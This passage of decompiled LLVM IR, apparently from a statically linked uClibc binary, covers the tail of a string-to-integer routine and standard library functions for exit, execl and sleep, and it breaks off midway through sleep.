  %v0_80515fc21 = phi i32 [ %v1_8051569, %dec_label_pc_8051569 ], [ %v4_805151f, %dec_label_pc_8051561 ], [ %v1_8051569, %dec_label_pc_8051577 ]
  %v3_8051582 = phi i32 [ %v1_805156a, %dec_label_pc_8051569 ], [ %v1_8051561, %dec_label_pc_8051561 ], [ %v2_8051577, %dec_label_pc_8051577 ]
  %v1_805157a = add i32 %v3_8051582, -17
  %v6_805157a = sub i32 16, %v3_8051582
  %v7_805157a = and i32 %v6_805157a, %v3_8051582
  %v8_805157a = icmp slt i32 %v7_805157a, 0
  %v10_805157a = icmp slt i32 %v1_805157a, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8051582 = icmp eq i1 %v10_805157a, %v8_805157a
  %v5_8051582 = select i1 %v2_8051582, i32 16, i32 %v3_8051582
  store i32 %v5_8051582, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051585

dec_label_pc_8051585:                             ; preds = %dec_label_pc_8051557, %dec_label_pc_805157a
  %v0_80515fc22 = phi i32 [ %v4_805151f, %dec_label_pc_8051557 ], [ %v0_80515fc21, %dec_label_pc_805157a ]
  %v0_80515a211 = phi i32 [ %v0_8051569, %dec_label_pc_8051557 ], [ %v0_80515a212, %dec_label_pc_805157a ]
  %v0_8051594 = phi i32 [ %arg3, %dec_label_pc_8051557 ], [ %v5_8051582, %dec_label_pc_805157a ]
  %v1_8051585 = add i32 %v0_8051594, -2
  store i32 %v1_8051585, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_805158d = icmp ugt i32 %v1_8051585, 34
  br i1 %v6_805158d, label %dec_label_pc_80515f1, label %dec_label_pc_805158f

dec_label_pc_805158f:                             ; preds = %dec_label_pc_8051585
  %div = udiv i32 -1, %v0_8051594
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp37 = urem i32 -1, %v0_8051594
  %v1_8051596 = trunc i32 %tmp37 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_80515cf = urem i32 %arg4, 256
  br label %dec_label_pc_80515a2

dec_label_pc_80515a0:                             ; preds = %dec_label_pc_80515e7, %dec_label_pc_80515cf
  %v2_80515a4.pre = phi i32 [ %v0_80515ea, %dec_label_pc_80515e7 ], [ %v2_80515a4.pre.pre, %dec_label_pc_80515cf ]
  %v4_80515a2.pre = phi i32 [ %v1_80515bb, %dec_label_pc_80515e7 ], [ %v4_80515a2.pre.pre, %dec_label_pc_80515cf ]
  %v0_80515a0 = phi i32 [ %v1_80515c2, %dec_label_pc_80515e7 ], [ %v0_80515a0.pre, %dec_label_pc_80515cf ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_80515e7 ], [ %v6_80515d3, %dec_label_pc_80515cf ]
  br label %dec_label_pc_80515a2

dec_label_pc_80515a2:                             ; preds = %dec_label_pc_805158f, %dec_label_pc_80515a0
  %v0_80515fc20 = phi i32 [ %v0_80515fc22, %dec_label_pc_805158f ], [ %v0_80515a0, %dec_label_pc_80515a0 ]
  %v0_80515c2 = phi i32 [ %v0_80515a211, %dec_label_pc_805158f ], [ %v0_80515a0, %dec_label_pc_80515a0 ]
  %v2_80515a4 = phi i32 [ %v4_805151f, %dec_label_pc_805158f ], [ %v2_80515a4.pre, %dec_label_pc_80515a0 ]
  %v4_80515a2 = phi i32 [ %div, %dec_label_pc_805158f ], [ %v4_80515a2.pre, %dec_label_pc_80515a0 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_805158f ], [ %stack_var_-18.1, %dec_label_pc_80515a0 ]
  %v1_80515a2 = inttoptr i32 %v0_80515c2 to i8*
  %v2_80515a2 = load i8, i8* %v1_80515a2, align 1
  %v3_80515a2 = zext i8 %v2_80515a2 to i32
  %v5_80515a2 = and i32 %v4_80515a2, -256
  %v6_80515a2 = or i32 %v3_80515a2, %v5_80515a2
  store i32 %v6_80515a2, i32* %eax.global-to-local, align 4
  %v2_80515a6 = add i8 %v2_80515a2, -48
  %v12_80515a6 = zext i8 %v2_80515a6 to i32
  %v14_80515a6 = and i32 %v2_80515a4, -256
  %v15_80515a6 = or i32 %v12_80515a6, %v14_80515a6
  store i32 %v15_80515a6, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_80515a6, 10
  br i1 %tmp, label %dec_label_pc_80515bb, label %dec_label_pc_80515ae

dec_label_pc_80515ae:                             ; preds = %dec_label_pc_80515a2
  %v2_80515ae = or i8 %v2_80515a2, 32
  %v7_80515ae = zext i8 %v2_80515ae to i32
  %v10_80515ae = or i32 %v7_80515ae, %v5_80515a2
  store i32 %v10_80515ae, i32* %eax.global-to-local, align 4
  %v2_80515b0 = or i32 %v14_80515a6, 40
  store i32 %v2_80515b0, i32* @ecx, align 4
  %tmp54 = icmp ult i8 %v2_80515ae, 97
  br i1 %tmp54, label %dec_label_pc_80515bb, label %dec_label_pc_80515b6

dec_label_pc_80515b6:                             ; preds = %dec_label_pc_80515ae
  %v2_80515b8 = add i8 %v2_80515ae, -87
  %v15_80515b8 = zext i8 %v2_80515b8 to i32
  %v18_80515b8 = or i32 %v15_80515b8, %v14_80515a6
  store i32 %v18_80515b8, i32* @ecx, align 4
  br label %dec_label_pc_80515bb

dec_label_pc_80515bb:                             ; preds = %dec_label_pc_80515ae, %dec_label_pc_80515a2, %dec_label_pc_80515b6
  %v0_80515ea = phi i32 [ %v2_80515b0, %dec_label_pc_80515ae ], [ %v15_80515a6, %dec_label_pc_80515a2 ], [ %v18_80515b8, %dec_label_pc_80515b6 ]
  %v1_80515bb = urem i32 %v0_80515ea, 256
  store i32 %v1_80515bb, i32* %eax.global-to-local, align 4
  %v1_80515be = load i32, i32* %esi.global-to-local, align 4
  %v2_80515be = sub i32 %v1_80515bb, %v1_80515be
  %v10_80515be = and i32 %v2_80515be, %v1_80515be
  %v11_80515be = icmp slt i32 %v10_80515be, 0
  %v13_80515be = icmp slt i32 %v2_80515be, 0
  %v2_80515c0 = icmp eq i1 %v13_80515be, %v11_80515be
  br i1 %v2_80515c0, label %dec_label_pc_80515f1, label %dec_label_pc_80515c2

dec_label_pc_80515c2:                             ; preds = %dec_label_pc_80515bb
  %v1_80515c2 = add i32 %v0_80515c2, 1
  store i32 %v1_80515c2, i32* %ebx.global-to-local, align 4
  %v0_80515c3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80515c3 = load i32, i32* %ebp.global-to-local, align 4
  %tmp55 = icmp ugt i32 %v0_80515c3, %v1_80515c3
  br i1 %tmp55, label %dec_label_pc_80515cf, label %dec_label_pc_80515c7

dec_label_pc_80515c7:                             ; preds = %dec_label_pc_80515c2
  %v12_80515c3 = icmp eq i32 %v0_80515c3, %v1_80515c3
  %v1_80515c7 = icmp eq i1 %v12_80515c3, false
  br i1 %v1_80515c7, label %dec_label_pc_80515e7, label %dec_label_pc_80515c9

dec_label_pc_80515c9:                             ; preds = %dec_label_pc_80515c7
  %v1_80515c9 = trunc i32 %v0_80515ea to i8
  %tmp56 = icmp ugt i8 %v1_80515c9, %v1_8051596
  br i1 %tmp56, label %dec_label_pc_80515cf, label %dec_label_pc_80515e7

dec_label_pc_80515cf:                             ; preds = %dec_label_pc_80515c9, %dec_label_pc_80515c2
  store i32 %v4_80515cf, i32* %eax.global-to-local, align 4
  %v6_80515d3 = and i8 %stack_var_-18.2, %tmp36
  %v1_80515d7 = sext i8 %v6_80515d3 to i32
  %v2_80515d7 = call i32 @__errno_location(i32 %v1_80515d7)
  store i32 %v2_80515d7, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80515df = inttoptr i32 %v2_80515d7 to i32*
  store i32 34, i32* %v1_80515df, align 4
  %v0_80515a0.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_80515a2.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_80515a4.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80515a0

dec_label_pc_80515e7:                             ; preds = %dec_label_pc_80515c9, %dec_label_pc_80515c7
  %v4_80515e7 = mul i32 %v0_80515c3, %v1_80515be
  store i32 %v1_80515bb, i32* %eax.global-to-local, align 4
  %v2_80515ed = add i32 %v4_80515e7, %v1_80515bb
  store i32 %v2_80515ed, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80515a0

dec_label_pc_80515f1:                             ; preds = %dec_label_pc_80515bb, %dec_label_pc_8051585
  %v0_80515fc = phi i32 [ %v0_80515fc22, %dec_label_pc_8051585 ], [ %v0_80515fc20, %dec_label_pc_80515bb ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8051585 ], [ %stack_var_-18.2, %dec_label_pc_80515bb ]
  %v4_80515f1 = icmp eq i32 %arg2, 0
  br i1 %v4_80515f1, label %dec_label_pc_80515fe, label %dec_label_pc_80515f8

dec_label_pc_80515f8:                             ; preds = %dec_label_pc_80515f1
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80515fc = inttoptr i32 %arg2 to i32*
  store i32 %v0_80515fc, i32* %v2_80515fc, align 4
  br label %dec_label_pc_80515fe

dec_label_pc_80515fe:                             ; preds = %dec_label_pc_80515f1, %dec_label_pc_80515f8
  %v8_80515fe = icmp eq i8 %stack_var_-18.3, 0
  %v2_8051603 = zext i1 %v8_80515fe to i32
  %v13_8051603 = icmp eq i1 %v8_80515fe, false
  %v1_80516052 = or i32 %v2_8051603, -2147483648
  store i32 %v1_80516052, i32* %ebx.global-to-local, align 4
  %v5_805160b = icmp eq i8 %tmp36, 0
  br i1 %v5_805160b, label %dec_label_pc_8051623, label %dec_label_pc_8051612

dec_label_pc_8051612:                             ; preds = %dec_label_pc_80515fe
  %v0_8051612 = load i32, i32* %edx.global-to-local, align 4
  %tmp57 = icmp ugt i32 %v0_8051612, %v1_80516052
  br i1 %tmp57, label %dec_label_pc_8051616, label %dec_label_pc_8051623

dec_label_pc_8051616:                             ; preds = %dec_label_pc_8051612
  %v1_8051616 = sext i8 %stack_var_-18.3 to i32
  %v2_8051616 = call i32 @__errno_location(i32 %v1_8051616)
  store i32 %v2_8051616, i32* %eax.global-to-local, align 4
  %v0_805161b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805161b, i32* %edx.global-to-local, align 4
  %v1_805161d = inttoptr i32 %v2_8051616 to i32*
  store i32 34, i32* %v1_805161d, align 4
  br label %dec_label_pc_8051623

dec_label_pc_8051623:                             ; preds = %dec_label_pc_8051612, %dec_label_pc_80515fe, %dec_label_pc_8051616
  %v0_8051623 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051625 = sub i32 0, %v0_8051623
  %v4_805162c = select i1 %v13_8051603, i32 %v1_8051625, i32 %v0_8051623
  store i32 %v4_805162c, i32* @edx, align 4
  %v2_8051632 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051632, i32* @ebx, align 4
  store i32 %v4_805162c, i32* %eax.global-to-local, align 4
  ret i32 %v4_805162c

; uselistorder directives
  uselistorder i32 %v4_805162c, { 1, 0, 2 }
  uselistorder i1 %v8_80515fe, { 1, 0 }
  uselistorder i8 %v6_80515d3, { 1, 0 }
  uselistorder i32 %v1_80515c3, { 1, 0 }
  uselistorder i32 %v0_80515c3, { 2, 1, 0 }
  uselistorder i32 %v1_80515c2, { 1, 0 }
  uselistorder i32 %v2_80515be, { 1, 0 }
  uselistorder i32 %v1_80515bb, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80515ea, { 2, 0, 1 }
  uselistorder i8 %v2_80515ae, { 1, 0, 2 }
  uselistorder i32 %v14_80515a6, { 0, 2, 1 }
  uselistorder i32 %v0_80515a0, { 1, 0 }
  uselistorder i32 %v0_8051594, { 1, 0, 2 }
  uselistorder i32 %v3_8051582, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8051577, { 1, 0 }
  uselistorder i32 %v1_805156a, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8051569, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp36, { 1, 0 }
  uselistorder i8 %v2_8051532.lcssa, { 1, 0 }
  uselistorder i32 %v0_8051531.lcssa, { 1, 0 }
  uselistorder i32 %v1_8051531, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8051527, { 1, 0, 2 }
  uselistorder i32 %v4_805151f, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051623, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515fe, { 1, 0 }
  uselistorder label %dec_label_pc_80515bb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515a2, { 1, 0 }
  uselistorder label %dec_label_pc_8051585, { 1, 0 }
  uselistorder label %dec_label_pc_805157a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051557, { 1, 0 }
  uselistorder label %dec_label_pc_8051556, { 1, 0 }
  uselistorder label %dec_label_pc_8051531, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805164f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805164f, i32* @ebx, align 4
  %v2_8051654 = call i32 @__pthread_return_void(i32 %v2_805164f, i32 134552147)
  %v1_8051660 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058460.207 to i32))
  %v0_8051665 = load i32, i32* @global_var_805e704.208, align 4
  store i32 %v0_8051665, i32* @eax, align 4
  %v1_805166d = icmp eq i32 %v0_8051665, 0
  br i1 %v1_805166d, label %dec_label_pc_805167a, label %dec_label_pc_8051671

dec_label_pc_8051671:                             ; preds = %entry
  %v0_8051674 = load i32, i32* @esi, align 4
  %v1_8051675 = call i32 @unknown_0(i32 %v0_8051674)
  store i32 %v1_8051675, i32* @eax, align 4
  br label %dec_label_pc_805167a

dec_label_pc_805167a:                             ; preds = %entry, %dec_label_pc_8051671
  %v2_805167f = call i32 @__pthread_return_void(i32 %v2_805164f, i32 1)
  %v0_8051684 = call i32 @__GI___uClibc_fini()
  %v0_8051695 = call i32 @_stdio_term()
  %v0_805169d = load i32, i32* @esi, align 4
  %v1_805169e = call i32 @__GI__exit(i32 %v0_805169d)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_805167a, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_80516aa = load i32, i32* @ebx, align 4
  store i32 %v0_80516aa, i32* %stack_var_-12, align 4
  %v2_80516ab = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80516ab, i32* %eax.global-to-local, align 4
  %v12_80516ae = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80516b4

dec_label_pc_80516b4:                             ; preds = %dec_label_pc_80516b4, %entry
  %v0_80516b7 = phi i32 [ 0, %entry ], [ %v1_80516b7, %dec_label_pc_80516b4 ]
  %stack_var_-16.0 = phi i32 [ %v2_80516ab, %entry ], [ %v1_80516b8, %dec_label_pc_80516b4 ]
  %v1_80516b7 = add i32 %v0_80516b7, 1
  store i32 %v1_80516b7, i32* %esi.global-to-local, align 4
  %v1_80516b8 = add i32 %stack_var_-16.0, 4
  store i32 %v1_80516b8, i32* %eax.global-to-local, align 4
  %v1_80516be = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80516be = load i32, i32* %v1_80516be, align 4
  %v3_80516be = icmp eq i32 %v2_80516be, 0
  %v1_80516c1 = icmp eq i1 %v3_80516be, false
  br i1 %v1_80516c1, label %dec_label_pc_80516b4, label %dec_label_pc_80516c3

dec_label_pc_80516c3:                             ; preds = %dec_label_pc_80516b4
  %v1_80516c3 = mul i32 %v1_80516b7, 4
  %v2_80516c3 = add i32 %v1_80516c3, 34
  %v1_80516ca = and i32 %v2_80516c3, -16
  %v2_80516cd = sub i32 %v12_80516ae, %v1_80516ca
  %v1_80516d2 = add i32 %v2_80516cd, 15
  %v1_80516d6 = and i32 %v1_80516d2, -16
  store i32 %v1_80516d6, i32* @ebx, align 4
  store i32 %v1_80516d6, i32* %ecx.global-to-local, align 4
  %v2_80516db = inttoptr i32 %v1_80516d6 to i32*
  store i32 %arg2, i32* %v2_80516db, align 16
  store i32 %v2_80516ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80516e3

dec_label_pc_80516e3:                             ; preds = %dec_label_pc_80516e3, %dec_label_pc_80516c3
  %stack_var_-16.1 = phi i32 [ %v2_80516ab, %dec_label_pc_80516c3 ], [ %v1_80516ea, %dec_label_pc_80516e3 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_80516e6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80516e6 = add i32 %v0_80516e6, 4
  store i32 %v1_80516e6, i32* %ecx.global-to-local, align 4
  %v0_80516e9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80516e9 = add i32 %v0_80516e9, -1
  %v8_80516e9 = icmp eq i32 %v1_80516e9, 0
  store i32 %v1_80516e9, i32* %esi.global-to-local, align 4
  %v1_80516ea = add i32 %stack_var_-16.1, 4
  %v1_80516f0 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_80516f0 = load i32, i32* %v1_80516f0, align 4
  store i32 %v2_80516f0, i32* %eax.global-to-local, align 4
  %v2_80516f2 = inttoptr i32 %v1_80516e6 to i32*
  store i32 %v2_80516f0, i32* %v2_80516f2, align 4
  %v1_80516f4 = icmp eq i1 %v8_80516e9, false
  br i1 %v1_80516f4, label %dec_label_pc_80516e3, label %dec_label_pc_80516f6

dec_label_pc_80516f6:                             ; preds = %dec_label_pc_80516e3
  %v0_80516f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80516f6 = load i32, i32* @esp, align 4
  %v2_80516f6 = add i32 %v1_80516f6, -4
  %v3_80516f6 = inttoptr i32 %v2_80516f6 to i32*
  store i32 %v0_80516f6, i32* %v3_80516f6, align 4
  %v0_80516f7 = load i32, i32* @global_var_805e70c.209, align 4
  %v2_80516f7 = add i32 %v1_80516f6, -8
  %v3_80516f7 = inttoptr i32 %v2_80516f7 to i32*
  store i32 %v0_80516f7, i32* %v3_80516f7, align 4
  %v0_80516fd = load i32, i32* @ebx, align 4
  %v2_80516fd = add i32 %v1_80516f6, -12
  %v3_80516fd = inttoptr i32 %v2_80516fd to i32*
  store i32 %v0_80516fd, i32* %v3_80516fd, align 4
  %v5_80516fe = add i32 %v1_80516f6, -16
  %v6_80516fe = inttoptr i32 %v5_80516fe to i32*
  store i32 %arg1, i32* %v6_80516fe, align 4
  %v1_8051701 = inttoptr i32 %v1_80516ea to i8*
  %v2_8051701 = call i32 @__GI_execve(i8* %v1_8051701)
  store i32 %v2_8051701, i32* %eax.global-to-local, align 4
  %v2_8051709 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051709, i32* @ebx, align 4
  ret i32 %v2_8051701

; uselistorder directives
  uselistorder i32 %v1_80516e9, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_80516b8, { 1, 0 }
  uselistorder i32 %v1_80516b7, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80516ab, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8051716 = load i32, i32* @edi, align 4
  %v0_8051717 = load i32, i32* @esi, align 4
  %v0_8051718 = load i32, i32* @ebx, align 4
  %v15_8051719 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8051726 = icmp eq i32 %arg1, 0
  %v1_8051728 = icmp eq i1 %v1_8051726, false
  br i1 %v1_8051728, label %dec_label_pc_805173a.preheader, label %dec_label_pc_8051887

dec_label_pc_805173a.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805172f

dec_label_pc_805172f:                             ; preds = %dec_label_pc_805172f.dec_label_pc_805172f_crit_edge, %dec_label_pc_805173a.preheader
  %v0_805172f = phi i32 [ %v15_8051719, %dec_label_pc_805173a.preheader ], [ %v0_805172f.pre, %dec_label_pc_805172f.dec_label_pc_805172f_crit_edge ]
  %v1_805173a27 = phi i32 [ 31, %dec_label_pc_805173a.preheader ], [ %v1_805173a, %dec_label_pc_805172f.dec_label_pc_805172f_crit_edge ]
  %v2_805172f = mul i32 %v1_805173a27, 4
  %v3_805172f = add i32 %v2_805172f, 292
  %v4_805172f = add i32 %v3_805172f, %v0_805172f
  %v5_805172f = inttoptr i32 %v4_805172f to i32*
  store i32 0, i32* %v5_805172f, align 4
  %v0_805173a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805173a = add i32 %v0_805173a.pre, -1
  %v9_805173a = icmp slt i32 %v1_805173a, 0
  store i32 %v1_805173a, i32* %eax.global-to-local, align 4
  %v1_805173b = icmp eq i1 %v9_805173a, false
  br i1 %v1_805173b, label %dec_label_pc_805172f.dec_label_pc_805172f_crit_edge, label %dec_label_pc_805173d

dec_label_pc_805172f.dec_label_pc_805172f_crit_edge: ; preds = %dec_label_pc_805172f
  %v0_805172f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805172f

dec_label_pc_805173d:                             ; preds = %dec_label_pc_805172f
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8051753 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8051753, i32* @ebx, align 4
  store i32 %v2_8051753, i32* %stack_var_-460, align 4
  %v4_805175b = call i32 @__sigaddset(i32 %v2_8051753, i32 17, i32 %v1_805173a, i32 %v1_805173a)
  store i32 %v4_805175b, i32* %eax.global-to-local, align 4
  %v2_8051763 = icmp slt i32 %v4_805175b, 0
  br i1 %v2_8051763, label %dec_label_pc_805188b, label %dec_label_pc_805176b

dec_label_pc_805176b:                             ; preds = %dec_label_pc_805173d
  %v2_805176c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_805176c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8051777 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8051777 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8051777, i32 %v2_805176c)
  store i32 %v4_8051777, i32* %eax.global-to-local, align 4
  %v1_805177f = icmp eq i32 %v4_8051777, 0
  %v1_8051781 = icmp eq i1 %v1_805177f, false
  br i1 %v1_8051781, label %dec_label_pc_805188b, label %dec_label_pc_8051787

dec_label_pc_8051787:                             ; preds = %dec_label_pc_805176b
  store i32 %v2_805176c, i32* %stack_var_-460, align 4
  %v4_805178c = call i32 @__sigismember(i32 %v2_805176c, i32 17, i32 %v4_8051777, i32 %v4_8051777)
  store i32 %v4_805178c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051799 = icmp eq i32 %v4_805178c, 0
  br i1 %v1_8051799, label %dec_label_pc_80517ad.preheader, label %dec_label_pc_8051855

dec_label_pc_80517ad.preheader:                   ; preds = %dec_label_pc_8051787
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80517a2

dec_label_pc_80517a2:                             ; preds = %dec_label_pc_80517a2.dec_label_pc_80517a2_crit_edge, %dec_label_pc_80517ad.preheader
  %v0_80517a2 = phi i32 [ %v15_8051719, %dec_label_pc_80517ad.preheader ], [ %v0_80517a2.pre, %dec_label_pc_80517a2.dec_label_pc_80517a2_crit_edge ]
  %v1_80517ad26 = phi i32 [ 31, %dec_label_pc_80517ad.preheader ], [ %v1_80517ad, %dec_label_pc_80517a2.dec_label_pc_80517a2_crit_edge ]
  %v2_80517a2 = mul i32 %v1_80517ad26, 4
  %v3_80517a2 = add i32 %v2_80517a2, 292
  %v4_80517a2 = add i32 %v3_80517a2, %v0_80517a2
  %v5_80517a2 = inttoptr i32 %v4_80517a2 to i32*
  store i32 0, i32* %v5_80517a2, align 4
  %v0_80517ad.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80517ad = add i32 %v0_80517ad.pre, -1
  %v9_80517ad = icmp slt i32 %v1_80517ad, 0
  store i32 %v1_80517ad, i32* %edx.global-to-local, align 4
  %v1_80517ae = icmp eq i1 %v9_80517ad, false
  br i1 %v1_80517ae, label %dec_label_pc_80517a2.dec_label_pc_80517a2_crit_edge, label %dec_label_pc_80517b0

dec_label_pc_80517a2.dec_label_pc_80517a2_crit_edge: ; preds = %dec_label_pc_80517a2
  %v0_80517a2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517a2

dec_label_pc_80517b0:                             ; preds = %dec_label_pc_80517a2
  store i32 %v2_8051753, i32* %eax.global-to-local, align 4
  store i32 %v2_8051753, i32* %stack_var_-460, align 4
  %v4_80517bc = call i32 @__sigaddset(i32 %v2_8051753, i32 17, i32 0, i32 0)
  store i32 %v4_80517bc, i32* %eax.global-to-local, align 4
  %v2_80517c4 = icmp slt i32 %v4_80517bc, 0
  br i1 %v2_80517c4, label %dec_label_pc_805188b, label %dec_label_pc_80517cc

dec_label_pc_80517cc:                             ; preds = %dec_label_pc_80517b0
  %v2_80517cd = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80517cd, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80517d6 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_80517cd)
  store i32 %v4_80517d6, i32* %eax.global-to-local, align 4
  %v2_80517de = icmp slt i32 %v4_80517d6, 0
  %v1_80517e0 = icmp eq i1 %v2_80517de, false
  br i1 %v1_80517e0, label %dec_label_pc_805180a, label %dec_label_pc_80517e2

dec_label_pc_80517e2:                             ; preds = %dec_label_pc_80517cc
  %v0_80517e2 = load i32, i32* %stack_var_-460, align 4
  %v1_80517e2 = call i32 @__errno_location(i32 %v0_80517e2)
  store i32 %v1_80517e2, i32* %eax.global-to-local, align 4
  %v1_80517e7 = inttoptr i32 %v1_80517e2 to i32*
  %v2_80517e7 = load i32, i32* %v1_80517e7, align 4
  store i32 %v2_80517e7, i32* @esi, align 4
  store i32 %v1_80517e2, i32* @ebx, align 4
  store i32 %v2_805176c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80517f8 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80517f8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80517f8, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051803 = load i32, i32* @esi, align 4
  %v1_8051803 = load i32, i32* @ebx, align 4
  %v2_8051803 = inttoptr i32 %v1_8051803 to i32*
  store i32 %v0_8051803, i32* %v2_8051803, align 4
  %v0_8051898.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805188e

dec_label_pc_805180a:                             ; preds = %dec_label_pc_80517cc
  %v3_805180a = load i32, i32* %stack_var_-420, align 4
  %v12_805180a = icmp eq i32 %v3_805180a, 1
  %v2_8051816 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051816, i32* @ebx, align 4
  %v1_805181d = icmp eq i1 %v12_805180a, false
  br i1 %v1_805181d, label %dec_label_pc_8051844, label %dec_label_pc_805181f

dec_label_pc_805181f:                             ; preds = %dec_label_pc_805180a
  store i32 %v2_8051816, i32* %stack_var_-460, align 4
  %v2_8051823 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8051823 = call i32 @__libc_nanosleep(%timespec* %v2_8051823, i32 %v2_8051816)
  store i32 %v3_8051823, i32* %eax.global-to-local, align 4
  store i32 %v3_8051823, i32* @edi, align 4
  %v1_805182a = call i32 @__errno_location(i32 %v2_8051816)
  store i32 %v1_805182a, i32* %eax.global-to-local, align 4
  %v1_8051832 = inttoptr i32 %v1_805182a to i32*
  %v2_8051832 = load i32, i32* %v1_8051832, align 4
  store i32 %v2_8051832, i32* @esi, align 4
  store i32 %v1_805182a, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805183b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
